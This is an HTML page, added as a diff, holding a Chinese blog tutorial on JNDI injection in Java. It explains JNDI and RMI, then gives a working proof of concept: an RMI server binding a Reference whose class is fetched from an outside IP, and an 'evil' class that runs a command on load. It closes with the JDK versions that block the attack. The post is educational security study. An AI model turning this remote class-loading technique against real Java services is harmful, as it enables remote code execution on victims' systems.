@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Java安全---JNDI注入解析 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Java安全—JNDI注入解析一、什么是JNDI​    JNDI全称为Java命名和目录接口。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。 ​    命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。 ​    目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全---JNDI注入解析">
+<meta property="og:url" content="http://example.com/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Java安全—JNDI注入解析一、什么是JNDI​    JNDI全称为Java命名和目录接口。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。 ​    命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。 ​    目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115153229.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115847357.png">
+<meta property="article:published_time" content="2022-03-31T02:05:06.000Z">
+<meta property="article:modified_time" content="2022-03-31T02:05:06.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115153229.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Java安全---JNDI注入解析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" class="article-date">
+  <time datetime="2022-03-31T02:05:06.000Z" itemprop="datePublished">2022-03-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Java安全---JNDI注入解析
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Java安全—JNDI注入解析"><a href="#Java安全—JNDI注入解析" class="headerlink" title="Java安全—JNDI注入解析"></a><code>Java</code>安全—<code>JNDI</code>注入解析</h1><h2 id="一、什么是JNDI"><a href="#一、什么是JNDI" class="headerlink" title="一、什么是JNDI"></a>一、什么是<code>JNDI</code></h2><p>​    <code>JNDI</code>全称为<code>Java</code>命名和目录接口。我们可以理解为<code>JNDI</code>提供了两个服务，即命名服务和目录服务。</p>
+<p>​    命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。</p>
+<p>​    目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器来进行查找。</p>
+<p>​    对比一下命名服务和目录服务，其实命名服务就是绑定对象，而目录服务就是绑定了对象的属性。在<code>JNDI</code>中，命名服务和目录服务是一起结合提供的，最容易理解的一个例子就是<code>RMI</code>。</p>
+<p>​    在<code>RMI</code>的服务端，通常我们会将一个远程对象和一个名称进行绑定，然后将其注册到注册表里面。除了通过<code>RMI</code>来实现客户端从而获取到对象之外，还可以使用<code>JNDI</code>来获取对象。<code>JNDI</code>其实就是对这些提供了命名服务或者目录服务的逻辑进行了一个封装，例如上面的<code>RMI</code>，我们可以直接调用<code>JNDI</code>提供的<code>lookup</code>函数来远程获取，例如：<code>lookup(&quot;rmi://127.0.0.1/bind&quot;)</code>；如果提供服务的是<code>LDAP</code>，我们同样可以通过<code>lookup(&quot;ldap://127.0.0.1/&quot;)</code>来进行访问。</p>
+<p>​    通过上面这个例子，不难看出<code>JNDI</code>其实就是对这些服务的访问做了一个统一的处理。</p>
+<h2 id="二、JNDI的简单实践"><a href="#二、JNDI的简单实践" class="headerlink" title="二、JNDI的简单实践"></a>二、<code>JNDI</code>的简单实践</h2><p>​    通过上面的介绍，我们知道，想要实现<code>JNDI</code>，我们首先得需要一个容器，然后我们将一个对象绑定到容器里面。（这里结合<code>RMI</code>来实现一个简单的示例）</p>
+<h3 id="1、创建一个远程调用对象"><a href="#1、创建一个远程调用对象" class="headerlink" title="1、创建一个远程调用对象"></a>1、创建一个远程调用对象</h3><p>​    首先创建一个接口，继承<code>Remote</code>接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface RemoteMethod extends Remote &#123;</span><br><span class="line">    public void sayBye() throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    创建一个远程对象，实现该接口，并继承<code>UnicastRemoteObject</code>类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class M1sn0w extends UnicastRemoteObject implements RemoteMethod &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public int age;</span><br><span class="line">    public M1sn0w(String name,int age) throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void sayBye()&#123;</span><br><span class="line">        System.out.println(&quot;say bye!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、开启RMI服务端"><a href="#2、开启RMI服务端" class="headerlink" title="2、开启RMI服务端"></a>2、开启<code>RMI</code>服务端</h3><p>​    创建一个<code>RMI</code>服务端，并将一个远程对象绑定到注册表中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        M1sn0w m1sn0w = new M1sn0w(&quot;m1sn0w&quot;,22);</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.bind(&quot;m1sn0w&quot;,m1sn0w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、利用JNDI远程获取对象"><a href="#3、利用JNDI远程获取对象" class="headerlink" title="3、利用JNDI远程获取对象"></a>3、利用<code>JNDI</code>远程获取对象</h3><p>​        我们想要使用<code>JNDI</code>来远程获取对象，首先得需要获取一个容器，我们先看如下实例代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class jndi &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException &#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">      env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        Context ctx = new InitialContext(env);</span><br><span class="line">        RemoteMethod remoteMethod = (RemoteMethod) ctx.lookup(&quot;m1sn0w&quot;);</span><br><span class="line">        remoteMethod.sayBye();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    <code>Context.PROVIDER_URL</code>参数表示指定一个远程加载的地址，例如上面的<code>rmi://127.0.0.1:1099</code>，当我们通过<code>lookup</code>函数进行查找对象的时候，其实就是在<code>rmi://127.0.0.1:1099/m1sn0w</code>这个里面进行的查找。</p>
+<p>​    最后远程调用方法之后，会在服务端执行代码，将结果返回给<code>JNDI</code>客户端。</p>
+<h2 id="三、JNDI注入漏洞"><a href="#三、JNDI注入漏洞" class="headerlink" title="三、JNDI注入漏洞"></a>三、<code>JNDI</code>注入漏洞</h2><p>​    通过上面的这个例子，我们可以知道，通过<code>JNDI</code>可以远程加载对象。除了通过上面的<code>Context.PROVIDER_URL</code>来设置<code>URL</code>以外，我们可以直接在<code>lookup</code>参数指定<code>URL</code>，例如<code>lookup(&quot;rmi://127.0.0.1:1099/m1sn0w&quot;)</code>，由于<code>JNDI</code>存在一个动态地址转换协议，也就是说当我们在<code>lookup</code>上指定一个<code>URL</code>的时候，就会优先于<code>Context.PROVIDER_URL</code>的设置进行加载。</p>
+<p>​    至此，就可以想到，如果这个<code>lookup</code>参数可控的话，那么我们就可以传入恶意的<code>url</code>地址来控制受害者加载攻击者指定的恶意类。但是这里又会遇到一个问题，就是怎么进行攻击呢？</p>
+<p>​    当我们指定一个恶意的<code>URL</code>地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在<code>RMI</code>中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个<code>class</code>文件，当然也就不能成功获取到这个对象。</p>
+<h2 id="四、Reference类"><a href="#四、Reference类" class="headerlink" title="四、Reference类"></a>四、<code>Reference</code>类</h2><p>​    为了解决上面这个问题，我们引入了一个<code>Reference</code>类，这个类表示对存在于命名或者目录系统以外的对象的引用。简单理解一下，就是如果<code>RMI</code>服务端返回的是一个<code>Reference</code>对象或者其子类对象的话，当客户端获取远程对象<code>Stub</code>的时候，我们就可以指定客户端从一个具体的服务端上去加载<code>class</code>文件从而完成这个类的实例化。</p>
+<p>​    <code>Reference</code>类实例化需要三个参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">className：表示远程加载时所使用的类名</span><br><span class="line">classFactory：加载class中需要实例类的名称</span><br><span class="line">classFactoryLocation：指定远程加载类的地址</span><br></pre></td></tr></table></figure>
+
+<p>​    例如我们创建如下<code>Reference</code>类实例，并将其绑定到注册表中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        Reference reference = new Reference(&quot;111&quot;,&quot;evil&quot;,&quot;http://148.70.205.134:8080/&quot;);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.bind(&quot;m1sn0w&quot;,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    然后编写一个<code>evil.java</code>恶意类，编译之后，将<code>evil.class</code>上传到服务器上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">public class evil &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    之后使用<code>JNDI</code>来远程获取这个绑定的对象，最终会在本地弹出计算器框：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        Context ctx = new InitialContext(env);</span><br><span class="line">        ctx.lookup(&quot;m1sn0w&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115153229.png" alt="image-20211228115153229"></p>
+<p>​    这里有几个坑需要注意一下：</p>
+<p>​    1、首先就是<code>jdk</code>的版本，后面我们会再提，高版本的<code>jkd</code>做了限制，因此实验使用<code>jkd1.7</code>版本</p>
+<p>​    2、恶意类中不要带<code>package</code>包名，否则可能会报错</p>
+<p>​    我们梳理一下整个调用流程。首先我们创建了一个<code>Reference</code>实例对象，这三个参数表示的意思为：当远程加载对象之后，会先从本地找<code>111.class</code>文件是否存在，如果不存在，则从远程服务端<code>http://148.70.205.134:8080</code>中查找<code>evil.class</code>文件。接下来使用了<code>ReferenceWrapper</code>来包裹<code>Reference</code>是，原因是远程对象需要继承<code>UnicastRemoteObject</code>类，而<code>Reference</code>类并没有对该类进行继承，因此我们需要封装一下，跟进<code>ReferenceWrapper</code>类，可以发现其继承了<code>UnicastRemoteObject</code>类：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115847357.png" alt="image-20211228115847357"></p>
+<p>​    到此，我们对<code>JNDI</code>注入攻击有了一个大致的了解。对于<code>JNDI</code>注入漏洞，我们的攻击方式如下：（利用<code>RMI</code>）</p>
+<p>​    1、在存在注入的地方利用<code>RMI</code>远程加载，指向恶意的<code>URL</code></p>
+<p>​    2、我们在恶意的<code>URL</code>上搭建一个<code>RMI</code>服务，并绑定一个<code>Reference</code>对象，并指定恶意类的加载路径</p>
+<p>​    3、在服务端上放置恶意类编译后的<code>class</code>文件</p>
+<h2 id="五、官网修复策略"><a href="#五、官网修复策略" class="headerlink" title="五、官网修复策略"></a>五、官网修复策略</h2><p>最后我们来看一下，针对不同的<code>JDK</code>版本，官方给出了一些限制：</p>
+<p>1、<code>JDK 6u45、7u21</code>之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为<code>true</code>，表示禁用自动加载远程类文件。</p>
+<p>2、<code>JDK 6u141、7u131、8u121</code>之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>的选项。</p>
+<p>3、<code>JDK 6u211、7u201、8u191</code>之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止<code>LDAP</code>协议使用远程<code>codebase</code>的选项</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" data-id="cl8h1i72h00020bdp1pw13f3u" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          WordPress SQL注入漏洞（CVE-2022-21661分析与复现）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Java CC链1-5分析与总结</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
